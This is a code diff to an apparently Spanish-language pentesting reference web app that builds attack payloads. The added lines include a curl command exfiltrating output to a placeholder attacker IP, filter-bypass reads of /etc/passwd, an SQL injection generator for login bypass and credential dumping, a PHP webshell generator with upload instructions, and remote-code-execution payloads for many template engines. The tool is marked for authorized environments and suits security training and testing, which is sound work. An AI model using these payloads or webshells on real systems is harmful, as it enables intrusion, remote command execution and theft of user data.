+        {code:'; curl http://IP_ATACANTE/$(whoami)', d:'Exfiltra la salida por HTTP a tu servidor'},
+      ]},
+      {name:'Bypass de filtros', items:[
+        {code:'/bin/c?t /etc/passwd', d:'Comodines en la ruta del binario'},
+        {code:'cat${IFS}/etc/passwd', d:'${IFS} reemplaza el espacio si está filtrado'},
+      ]},
+    ],
+    note:'⚠ Confirma primero a ciegas (sleep): muchas veces se ejecuta aunque no veas la salida en la respuesta.',
+  },
+  {
+    id:'idor', owasp:'A01', icon:'🔑', name:'IDOR (Insecure Direct Object Reference)', tag:'Broken Access Control',
+    sub:'Cambiar un identificador para acceder a datos de otros usuarios.',
+    desc:'La aplicación usa un identificador que tú controlas (id numérico, nombre de fichero, UUID) para traer un objeto sin comprobar que ese objeto es tuyo. Cambiando el identificador se accede a datos u operaciones de otras cuentas.',
+    detection:'Buscar identificadores predecibles en URLs, parámetros, cuerpos JSON y cabeceras: /factura?id=1001, /api/user/5, filename=informe.pdf. Cambiarlos (subir/bajar, poner el de otra cuenta) y ver si devuelve datos ajenos.',
+    payloads:[
+      {code:'/api/user/1001  ->  /api/user/1002', d:'Incrementar o decrementar el ID numérico'},
+      {code:'file=miinforme.pdf  ->  file=../otro/informe.pdf', d:'Cambiar el nombre de fichero (enlaza con path traversal)'},
+      {code:'PUT /api/account/1002  (con TU sesión)', d:'IDOR de escritura — modificar objetos de otros, no solo leerlos'},
+      {code:'id=1002  probado con GET / POST / PUT / DELETE', d:'Probar el mismo id con distintos verbos HTTP'},
+    ],
+    note:'💡 Pruébalo con DOS cuentas: pide un recurso con la cuenta A y accede a ese id logueado como B. Si lo ves, es IDOR. Un UUID no te salva si se filtra en otra respuesta.',
+  },
+  {
+    id:'sqli', owasp:'A03', generator:true, icon:'💉', name:'SQL Injection', tag:'Injection',
+    sub:'Inyección en consultas SQL — de bypass de login a volcado completo de la BD.',
+    desc:'La aplicación construye una consulta SQL concatenando entrada del usuario sin parametrizar. Permite alterar la consulta: saltarse el login, extraer datos de otras tablas (UNION), o inferir datos poco a poco cuando no hay salida visible (blind).',
+    detection:'Meter una comilla simple en el parámetro y ver si la app da un error SQL o cambia de comportamiento. Confirmar con lógica booleana (AND 1=1 frente a AND 1=2).',
+    note:'💡 Cuando lo manual se queda corto, automatiza con sqlmap: sqlmap -u "http://objetivo/pagina?id=1" --batch --dbs, y luego -D basedatos --tables y --dump.',
   },
 ];
 
-function renderWebVulnList(){
+let _wvListScroll=0;
+function renderWebVulnList(restore){
   document.getElementById('webvulnDetail').style.display='none';
   const list=document.getElementById('webvulnList');
   list.style.display='block';
-  const probeOpts=['{{7*7}}','<%= 7*7 %>','${7*7}','@(7*7)','#{7*7}','{7*7}','#set($x=7*7)$x']
-    .map(p=>`<option value="${esc(p)}">${esc(p)}</option>`).join('');
   list.innerHTML=`<div style="margin-bottom:14px;">
     <div style="font-size:15px;font-weight:700;color:var(--text);font-family:var(--sans);">🕷 Vulnerabilidades Web</div>
-    <div style="font-size:11px;color:var(--text3);margin-top:2px;">Referencia de detección, payloads y bypass. Solo para entornos autorizados.</div>
+    <div style="font-size:11px;color:var(--text3);margin-top:2px;">Metodología: mapea la web → prueba cada clase de vulnerabilidad → explota. Fichas agrupadas por OWASP Top 10 2021. Solo para entornos autorizados.</div>
   </div>
-  <div class="enum-generator" style="margin-bottom:16px;border-color:rgba(0,221,255,.3);">
-    <div class="enum-gen-title">🧪 Identificador de motor SSTI</div>
-    <div class="enum-gen-row">
-      <span class="enum-gen-label">Payload probado</span>
-      <select class="enum-gen-sel" id="sstiProbe" onchange="identifySsti()" style="flex:1;">${probeOpts}</select>
-    </div>
-    <div class="enum-gen-row" style="align-items:flex-start;">
-      <span class="enum-gen-label">Respuesta vista</span>
-      <input type="text" class="enum-gen-input" id="sstiResp" oninput="identifySsti()" placeholder="Pega lo que devolvió el servidor (ej: 49)">
-    </div>
-    <div id="sstiIdOut" style="margin-top:8px;"></div>
+  <div style="display:flex;gap:8px;flex-wrap:wrap;align-items:center;margin-bottom:16px;">
+    <span style="font-size:9px;font-weight:700;letter-spacing:1.5px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);">Arsenal</span>
+    <a href="https://www.revshells.com/" target="_blank" class="wv-arsenal-btn" style="text-decoration:none;">🔌 Reverse shells ↗</a>
+    <button class="wv-arsenal-btn" onclick="openWebshellModal()">🕸 Webshells</button>
+    <button class="wv-arsenal-btn" onclick="openShellStabModal()">🐚 Estabilizar shell</button>
+    <button class="wv-arsenal-btn" onclick="openDictModal()">📚 Diccionarios / polyglots</button>
   </div>
-  <div class="wv-grid">${WEB_VULNS.map(v=>`
-    <div class="wv-card" onclick="openWebVuln('${v.id}')">
-      <div class="wv-card-icon">${v.icon}</div>
-      <div class="wv-card-name">${esc(v.name)}</div>
-      <span class="wv-card-tag">${esc(v.tag)}</span>
-      <div class="wv-card-sub">${esc(v.sub)}</div>
-    </div>`).join('')}</div>`;
-  identifySsti();
+  <details style="margin-bottom:16px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r2);padding:8px 12px;">
+    <summary style="cursor:pointer;font-size:10px;font-weight:700;letter-spacing:1px;text-transform:uppercase;color:var(--text3);font-family:var(--mono);user-select:none;">🧰 Cómo se prueba esto — Burp Suite</summary>
+    <div style="font-size:11px;color:var(--text2);line-height:1.6;margin-top:8px;">
+      Las pruebas web se hacen interceptando el tráfico con un proxy (Burp Suite), no tecleando los payloads en la barra del navegador:
+      <ul style="margin:6px 0 0 16px;padding:0;">
+        <li><b style="color:var(--cyan)">Proxy</b> — intercepta cada petición del navegador para verla y modificarla antes de enviarla.</li>
+        <li><b style="color:var(--cyan)">Repeater</b> — repite una petición cambiando un parámetro; ideal para probar payloads de uno en uno.</li>
+        <li><b style="color:var(--cyan)">Intruder</b> — automatiza: lanza una lista de payloads sobre un parámetro y compara las respuestas (fuzzing).</li>
+      </ul>
+    </div>
+  </details>
+  ${OWASP_CATS.map(cat=>{
+    const cards=WEB_VULNS.filter(v=>v.owasp===cat.id);
+    if(!cards.length) return '';
+    return `<div class="wv-owasp-hd">${esc(cat.name)}<br><small>${esc(cat.desc)}</small></div>
+    <div class="wv-grid">${cards.map(v=>`
+      <div class="wv-card" onclick="openWebVuln('${v.id}')">
+        <div class="wv-card-icon">${v.icon}</div>
+        <div class="wv-card-name">${esc(v.name)}</div>
+        <span class="wv-card-tag">${esc(v.tag)}</span>
+        <div class="wv-card-sub">${esc(v.sub)}</div>
+      </div>`).join('')}</div>`;
+  }).join('')}`;
+  // Al volver de una ficha, restaura la posición de scroll de la lista; en entrada nueva, arriba
+  const sc=document.getElementById('webvulnScroll'); if(sc) sc.scrollTop = restore ? _wvListScroll : 0;
 }
 
 function wvPayloadCard(code, desc){
@@ -4397,14 +4700,110 @@ function wvPayloadCard(code, desc){
   </div>`;
 }
 
+// ─── Generador SQLi (motor de BD + categorías, blind y enumeración) ───────────
+const SQLI_CATS=[
+  {id:'detect',      label:'Detección'},
+  {id:'fingerprint', label:'¿Qué BD es?'},
+  {id:'login',  label:'Bypass login'},
+  {id:'union',  label:'UNION'},
+  {id:'enum',   label:'Enumeración BD'},
+  {id:'bool',   label:'Blind booleano'},
+  {id:'time',   label:'Blind time'},
+];
+const SQLI_DB={
+  mysql:   {name:'MySQL/MariaDB', c:'-- -', ver:'@@version',  timeInj:"' AND SLEEP(5)-- -"},
+  mssql:   {name:'MSSQL',         c:'--',   ver:'@@version',  timeInj:"'; WAITFOR DELAY '0:0:5'--"},
+  postgres:{name:'PostgreSQL',    c:'--',   ver:'version()',  timeInj:"'; SELECT pg_sleep(5)--"},
+  oracle:  {name:'Oracle',        c:'--',   ver:'banner',     timeInj:"' AND 1=dbms_pipe.receive_message('a',5)--"},
+};
+function sqliPayloads(dbms, cat){
+  const db=SQLI_DB[dbms]||SQLI_DB.mysql; const c=db.c, v=db.ver;
+  switch(cat){
+    case 'detect': return [
+      {code:"'",              d:'Comilla simple — si da error SQL o cambia la respuesta, es candidato'},
+      {code:"''",             d:'Dos comillas — si el error desaparece, confirma inyección de cadena'},
+      {code:`' AND 1=1${c}`,  d:'Condición verdadera — la app responde con normalidad'},
+      {code:`' AND 1=2${c}`,  d:'Condición falsa — si responde distinto, hay inyección'},
+    ];
+    case 'fingerprint': return [
+      {code:"' UNION SELECT @@version-- -",            d:'Si @@version funciona → MySQL o MSSQL (mira el texto que devuelve)'},
+      {code:"' UNION SELECT version()-- -",            d:'Si version() funciona → MySQL o PostgreSQL'},
+      {code:"' UNION SELECT banner FROM v$version-- ",  d:'Si v$version funciona → Oracle'},
+      {code:"' AND '1'||'1'='11",                      d:"Si la concatenación || da '11' → PostgreSQL u Oracle (en MySQL || es OR lógico)"},
+      {code:"' AND '1'+'1'='11",                       d:'Si la concatenación con + da 11 → MSSQL'},
+      {code:"' AND SLEEP(5)-- -",                      d:'Si tarda ~5s → MySQL (SLEEP). MSSQL usa WAITFOR DELAY; PostgreSQL, pg_sleep()'},
+    ];
+    case 'login': return [
+      {code:`' OR 1=1${c}`,   d:'Condición siempre verdadera y comenta el resto de la query'},
+      {code:`admin'${c}`,     d:'Entra como admin comentando la comprobación de contraseña'},
+      {code:"' OR '1'='1",    d:'Bypass clásico sin comentario — cierra la comilla abierta'},
+    ];
+    case 'union': return [
+      {code:`' ORDER BY 1${c}`,          d:'Sube el número hasta que dé error: son las columnas de la query'},
+      {code:`' UNION SELECT NULL${c}`,   d:'Añade NULLs hasta que no dé error (mismo nº de columnas)'},
+      {code:`' UNION SELECT ${v},NULL${c}`, d:'Coloca la versión en una columna visible (ajusta los NULLs)'},
+    ];
+    case 'enum': return dbms==='oracle' ? [
+      {code:`' UNION SELECT table_name,NULL FROM all_tables${c}`, d:'Listar tablas (Oracle no usa information_schema)'},
+      {code:`' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USUARIOS'${c}`, d:'Columnas de una tabla'},
+    ] : [
+      {code:`' UNION SELECT table_name,NULL FROM information_schema.tables${c}`, d:'Listar todas las tablas de la BD'},
+      {code:`' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='usuarios'${c}`, d:'Listar columnas de una tabla'},
+      {code:`' UNION SELECT usuario,contrasena FROM usuarios${c}`, d:'Volcar credenciales una vez conoces tabla y columnas'},
+    ];
+    case 'bool': return [
+      {code:`' AND SUBSTRING((SELECT ${v}),1,1)='5${c}`, d:'Inferir datos carácter a carácter según la respuesta (Oracle: SUBSTR)'},
+      {code:`' AND (SELECT COUNT(*) FROM information_schema.tables)>10${c}`, d:'Preguntar sí/no sobre la BD observando el cambio de respuesta'},
+    ];
+    case 'time': return [
+      {code:db.timeInj, d:'Si la respuesta tarda ~5s, la inyección es válida (útil cuando no hay salida visible)'},
+    ];
+  }
+  return [];
+}
+let _sqliCat='detect';
+function setSqliCat(c){ _sqliCat=c; renderSqliGen(); }
+function renderSqliGen(){
+  const dbms=document.getElementById('sqliDbms')?.value||'mysql';
+  const btns=document.getElementById('sqliCatBtns');
+  if(btns) btns.innerHTML=SQLI_CATS.map(cat=>`<button class="enum-toggle ${cat.id===_sqliCat?'active':''}" onclick="setSqliCat('${cat.id}')">${esc(cat.label)}</button>`).join('');
+  const out=document.getElementById('sqliGenOut');
+  if(!out) return;
+  const head=_sqliCat==='fingerprint'
+    ? `<div class="enum-note" style="margin-bottom:8px;">Prueba estos para saber el motor. Cuando lo identifiques, selecciónalo arriba en «Motor de BD» y las demás categorías se adaptan a su sintaxis.</div>`
+    : '';
+  out.innerHTML=head+sqliPayloads(dbms,_sqliCat).map(p=>wvPayloadCard(p.code,p.d)).join('');
+}
+
+// ─── Generador de webshells PHP (parámetro editable) ──────────────────────────
+function openWebshellModal(){
+  renderWebshell();
+  document.getElementById('webshellModal').classList.add('show');
+  const _wm=document.querySelector('#webshellModal .modal'); if(_wm) _wm.scrollTop=0;
+}
+function renderWebshell(){
+  const param=((document.getElementById('webshellParam')?.value)||'cmd').trim()||'cmd';
+  const shells=[
+    {code:`<?php system($_GET['${param}']); ?>`, d:'Básico — ejecuta el comando y muestra la salida'},
+    {code:`<?php echo shell_exec($_GET['${param}']); ?>`, d:'Con shell_exec — útil si system está deshabilitado'},
+    {code:`<?php if(isset($_GET['${param}'])){echo "<pre>".shell_exec($_GET['${param}'])."</pre>";} ?>`, d:'Con comprobación y salida en <pre> (más legible)'},
+    {code:`<?php passthru($_GET['${param}']); ?>`, d:'Con passthru — otra alternativa si las demás están filtradas'},
+  ];
+  const out=document.getElementById('webshellBody');
+  if(!out) return;
+  out.innerHTML=`<div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin:8px 0 6px;">Cómo usarlo: súbelo como shell.php y visita <span style="color:var(--orange)">http://objetivo/ruta/shell.php?${esc(param)}=whoami</span></div>`
+    +shells.map(s=>wvPayloadCard(s.code,s.d)).join('');
+}
+
 function openWebVuln(id){
   const v=WEB_VULNS.find(x=>x.id===id);
   if(!v) return;
+  const _lsc=document.getElementById('webvulnScroll'); if(_lsc) _wvListScroll=_lsc.scrollTop;
   document.getElementById('webvulnList').style.display='none';
   const d=document.getElementById('webvulnDetail');
   d.style.display='block';
   let html=`<div class="wv-detail-hd">
-    <button class="wv-back" onclick="renderWebVulnList()">← Volver</button>
+    <button class="wv-back" onclick="renderWebVulnList(true)">← Volver</button>
     <span style="font-size:22px;">${v.icon}</span>
     <div style="flex:1;">
       <div style="font-size:16px;font-weight:700;color:var(--text);font-family:var(--sans);">${esc(v.name)}</div>
@@ -4415,11 +4814,43 @@ function openWebVuln(id){
   html+=`<div class="wv-sec"><div class="wv-sec-title desc">Descripción</div><div class="wv-desc-txt">${esc(v.desc)}</div></div>`;
   html+=`<div class="wv-sec"><div class="wv-sec-title det">Cómo detectarla</div><div class="wv-desc-txt">${esc(v.detection)}</div></div>`;
 
+  if(v.generator){
+    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Generador de payloads</div>
+      <div class="enum-generator">
+        <div class="enum-gen-row">
+          <span class="enum-gen-label">Motor de BD</span>
+          <select class="enum-gen-sel" id="sqliDbms" onchange="renderSqliGen()">
+            <option value="mysql">MySQL / MariaDB</option>
+            <option value="mssql">MSSQL</option>
+            <option value="postgres">PostgreSQL</option>
+            <option value="oracle">Oracle</option>
+          </select>
+        </div>
+        <div class="enum-gen-row" style="align-items:flex-start;">
+          <span class="enum-gen-label">Objetivo</span>
+          <div id="sqliCatBtns" class="enum-toggle-row" style="margin:0;"></div>
+        </div>
+        <div class="enum-note" style="margin-top:8px;">⚠ Payloads orientativos: la sintaxis exacta (sobre todo el blind en MSSQL/PostgreSQL/Oracle) depende del contexto de la inyección. En MySQL suelen ir directos; en el resto, ajústala si hace falta.</div>
+        <div id="sqliGenOut" style="margin-top:8px;"></div>
+      </div></div>`;
+  }
+
   if(v.engineTable){
     html+=`<div class="wv-sec"><div class="wv-sec-title det">Identificación de motor</div>
       <table class="wv-eng-table"><thead><tr><th>Payload</th><th>Resultado</th><th>Motor</th></tr></thead><tbody>
       ${v.engineTable.map(r=>`<tr><td>${esc(r.payload)}</td><td>${esc(r.result)}</td><td>${esc(r.engine)}</td></tr>`).join('')}
       </tbody></table></div>`;
+  }
+
+  if(v.id==='ssti'){
+    const probeOpts=['{{7*7}}','<%= 7*7 %>','${7*7}','@(7*7)','#{7*7}','{7*7}','#set($x=7*7)$x']
+      .map(pp=>`<option value="${esc(pp)}">${esc(pp)}</option>`).join('');
+    html+=`<div class="wv-sec"><div class="wv-sec-title pay">Identificador de motor (interactivo)</div>
+      <div class="enum-generator" style="border-color:rgba(0,221,255,.3);">
+        <div class="enum-gen-row"><span class="enum-gen-label">Payload probado</span><select class="enum-gen-sel" id="sstiProbe" onchange="identifySsti()" style="flex:1;">${probeOpts}</select></div>
+        <div class="enum-gen-row" style="align-items:flex-start;"><span class="enum-gen-label">Respuesta vista</span><input type="text" class="enum-gen-input" id="sstiResp" oninput="identifySsti()" placeholder="Pega lo que devolvió el servidor (ej: 49)"></div>
+        <div id="sstiIdOut" style="margin-top:8px;"></div>
+      </div></div>`;
   }
 
   if(v.payloads){
@@ -4443,6 +4874,9 @@ function openWebVuln(id){
   }
 
   d.innerHTML=html;
+  const sc=document.getElementById('webvulnScroll'); if(sc) sc.scrollTop=0;
+  if(v.generator){ _sqliCat='detect'; renderSqliGen(); }
+  if(v.id==='ssti') identifySsti();
 }
 
 // ─── SSTI ENGINE IDENTIFIER ───────────────────────────────────────────────────
@@ -4450,9 +4884,9 @@ function openWebVuln(id){
 const SSTI_ENGINES=[
   {engine:'Jinja2',    lang:'Python',  probe:'{{7*7}}',    rce:`{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}`},
   {engine:'Tornado',   lang:'Python',  probe:'{{7*7}}',    rce:`{% import os %}{{ os.popen('id').read() }}`},
-  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`${__import__('os').popen('id').read()}`},
+  {engine:'Mako',      lang:'Python',  probe:'${7*7}',     rce:`\${__import__('os').popen('id').read()}`},
   {engine:'ERB',       lang:'Ruby',    probe:'<%= 7*7 %>', rce:'<%= `id` %>'},
-  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}`},
+  {engine:'FreeMarker',lang:'Java',    probe:'${7*7}',     rce:`<#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`},
   {engine:'Velocity',  lang:'Java',    probe:'#set($x=7*7)$x', rce:`#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")`},
   {engine:'Twig',      lang:'PHP',     probe:'{{7*7}}',    rce:`{{['id']|filter('system')}}`},
   {engine:'Smarty',    lang:'PHP',     probe:'{7*7}',      rce:`{system('id')}`},
@@ -4536,6 +4970,7 @@ function openDictModal(){
 
   document.getElementById('dictBody').innerHTML=html;
   document.getElementById('dictModal').classList.add('show');
+  const _dm=document.querySelector('#dictModal .modal'); if(_dm) _dm.scrollTop=0;
 }
 
 async function saveNmapResult(btn){
@@ -4567,9 +5002,65 @@ async function saveNmapResult(btn){
 }
 
 function switchEnumTab(name){
-  ['discovery','services','nmap','winad'].forEach(t=>{
+  ['discovery','scan','services'].forEach(t=>{
     document.getElementById('esec-'+t).classList.toggle('show',t===name);
     document.getElementById('estab-'+t).classList.toggle('active',t===name);
+  });
+}
+
+// ─── Objetivo global de Enumeración ─────────────────────────────────────────
+const _ENUM_EXAMPLE_IP='10.10.10.1';
+const _ENUM_EXAMPLE_RANGE='192.168.1.0/24';
+let _enumTargetInit=false;
+const _CIDR_RE=/\d{1,3}(?:\.\d{1,3}){3}\/\d{1,2}/;
+function initEnumTarget(){
+  if(_enumTargetInit) return;
+  _enumTargetInit=true;
+  document.querySelectorAll('#panel-enum .enum-cmd-code').forEach(code=>{
+    const txt=code.textContent;
+    // Tarjetas con host: plantilla con token IP
+    if(/\bIP\b/.test(txt)) code.dataset.tpl=txt;
+    // Tarjetas con rango CIDR (descubrimiento): plantilla con token §R§
+    else if(_CIDR_RE.test(txt)) code.dataset.rangetpl=txt.replace(_CIDR_RE,'§R§');
+    else return;
+    // Reenlaza el botón copiar al texto ya sustituido
+    const btn=code.closest('.enum-cmd-row')?.querySelector('.enum-copy-btn');
+    if(btn) btn.onclick=()=>enumCopy(btn,code.textContent);
+  });
+  // Tabla "Otros servicios menos comunes": comandos en celdas de tabla
+  document.querySelectorAll('#panel-enum .enum-service-table td code').forEach(code=>{
+    if(!/\bIP\b/.test(code.textContent)) return;
+    code.dataset.tpl=code.textContent;
+    const btn=code.closest('tr')?.querySelector('.enum-copy-btn');
+    if(btn) btn.onclick=()=>enumCopy(btn,code.textContent);
+  });
+  applyEnumTarget();
+}
+function applyEnumTarget(){
+  const t=(document.getElementById('enumTarget').value||'').trim();
+  // Tarjetas con host (y celdas de tabla): IP → objetivo, o "IP" si está vacío
+  document.querySelectorAll('#panel-enum [data-tpl]').forEach(code=>{
+    code.textContent = t ? code.dataset.tpl.replace(/\bIP\b/g,t) : code.dataset.tpl;
+  });
+  // Generador Nmap (②): usa el objetivo, o la IP de ejemplo si está vacío
+  const ipField=document.getElementById('nmapIP');
+  if(ipField){ ipField.value = t || _ENUM_EXAMPLE_IP; buildNmapCmd(); }
+  // Generador de descubrimiento (①): si el objetivo es una IPv4, deriva su /24
+  const netField=document.getElementById('genNetRange');
+  if(netField){
+    if(/^\d{1,3}(\.\d{1,3}){3}$/.test(t)) netField.value=t.replace(/\.\d{1,3}$/,'.0')+'/24';
+    else if(!t) netField.value=_ENUM_EXAMPLE_RANGE;
+  }
+  syncEnumRange();
+}
+// El campo de rango del generador es la única fuente de verdad del rango:
+// alimenta el comando del generador y las tarjetas de descubrimiento (incluida
+// la máscara — /24, /26… lo que el usuario ponga ahí).
+function syncEnumRange(){
+  const netField=document.getElementById('genNetRange');
+  const range=(netField&&netField.value.trim())||_ENUM_EXAMPLE_RANGE;
+  document.querySelectorAll('#panel-enum .enum-cmd-code[data-rangetpl]').forEach(code=>{
+    code.textContent=code.dataset.rangetpl.replace('§R§',range);
   });
 }
 
@@ -4600,14 +5091,58 @@ function toggleEnumFlag(flag){
   buildNmapCmd();
 }
 
-function buildNetCmd(){
-  const range=(document.getElementById('genNetRange').value||'192.168.1.0/24').trim();
-  const tool=document.getElementById('genNetTool').value;
-  let cmd='';
-  if(tool==='netdiscover') cmd='sudo netdiscover -r '+range;
-  else if(tool==='arp-scan') cmd='sudo arp-scan '+range;
-  else cmd='nmap -sn '+range;
-  document.getElementById('genNetOutput').textContent=cmd;
+// #3 Puente puertos abiertos → servicios de ③
+function highlightServices(){
+  const raw=(document.getElementById('nmapPorts')?.value||'').trim();
+  const svc=document.getElementById('svcOpenPorts');
+  if(svc && svc.value!==raw) svc.value=raw;   // sincroniza el campo de ③ (sin disparar oninput)
+  const open=new Set((raw.match(/\d+/g)||[]).map(Number));
+  const any=open.size>0;
+  const onlyOpen=(document.getElementById('svcOnlyOpen')?.checked)&&any;
+  document.querySelectorAll('#esec-services .enum-accordion').forEach(acc=>{
+    const ports=(acc.querySelector('.enum-acc-port')?.textContent.match(/\d+/g)||[]).map(Number);
+    const isOpen=ports.some(p=>open.has(p));
+    acc.classList.toggle('svc-open', isOpen&&any);
+    acc.hidden = onlyOpen && !isOpen;
+  });
+  document.querySelectorAll('#tblOtrosServicios tbody tr').forEach(tr=>{
+    const ports=(tr.querySelector('td')?.textContent.match(/\d+/g)||[]).map(Number);
+    const isOpen=ports.some(p=>open.has(p));
+    tr.classList.toggle('svc-open-row', isOpen&&any);
+    tr.hidden = onlyOpen && !isOpen;
+  });
+  const hint=document.getElementById('svcOpenHint');
+  if(hint) hint.textContent = any
+    ? ('Resaltando servicios de: '+[...open].sort((a,b)=>a-b).join(', '))
+    : 'Escribe aquí los puertos abiertos (o rellénalos en ②) para resaltar sus servicios.';
+}
+function onNmapPortsChanged(){ buildNmapCmd(); highlightServices(); }
+
+// #10 Versión → exploit conocido (consulta Exploit-DB en vivo)
+async function searchExploitDB(){
+  const q=(document.getElementById('edbQuery').value||'').trim();
+  const out=document.getElementById('edbResults');
+  if(!q){ out.innerHTML=''; return; }
+  out.innerHTML='<div style="font-size:11px;color:var(--text3);font-family:var(--mono)">Buscando en Exploit-DB…</div>';
+  try{
+    const data=await API.get('/api/exploit-search?q='+encodeURIComponent(q));
+    if(!data.count){
+      out.innerHTML='<div style="font-size:11px;color:var(--text3)">Sin exploits públicos para <b>'+esc(q)+'</b>.'+(data.error?' <span style="color:var(--orange)">('+esc(data.error)+')</span>':'')+'</div>';
+      return;
+    }
+    out.innerHTML='<div style="font-size:10px;color:var(--text3);font-family:var(--mono);margin-bottom:6px;">'+data.count+' resultado(s) en Exploit-DB:</div>'+
+      data.exploits.map(e=>`<div class="enum-cmd-card" style="margin-bottom:6px;">
+        <a href="${esc(e.url)}" target="_blank" style="color:var(--cyan);font-size:12px;text-decoration:none;">${esc(e.title)} ↗</a>
+        <div class="enum-meta" style="margin-top:4px;">${e.type?`<span>${esc(e.type)}</span>`:''}${e.platform?`<span>${esc(e.platform)}</span>`:''}${e.date?`<span>${esc(e.date)}</span>`:''}${e.cve?`<span class="auth-tag auth-req">${esc(e.cve)}</span>`:''}${e.verified?'<span class="noise-tag noise-low">✓ verificado</span>':''}</div>
+      </div>`).join('');
+  }catch(err){
+    out.innerHTML='<div style="color:var(--red);font-size:11px">Error consultando Exploit-DB: '+esc(err.message)+'</div>';
+  }
+}
+function onSvcPortsChanged(){
+  const np=document.getElementById('nmapPorts');
+  if(np) np.value=document.getElementById('svcOpenPorts').value;
+  buildNmapCmd(); highlightServices();
 }
 
 function buildNmapCmd(){
